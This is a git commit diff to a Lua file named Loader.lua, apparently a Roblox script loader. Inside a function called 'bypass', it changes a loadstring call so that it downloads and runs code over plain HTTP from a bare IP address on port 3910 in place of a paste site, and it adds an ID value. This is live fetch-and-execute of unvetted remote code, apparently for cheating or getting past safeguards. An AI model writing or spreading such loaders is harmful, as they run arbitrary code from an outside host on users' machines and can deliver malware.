f2a068b2e2771bb1a199b1f72bcacbb122937884
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-09-02 14:09:51 +0800

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,5 +1,6 @@
 local function bypass()
-    loadstring(game:HttpGet("https://pastefy.app/2eieVein/raw"))()
+    ID="b0235f3a-fee6-4c84-b7ec-7cd06c976ba6";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 
 end
 local function loadui()
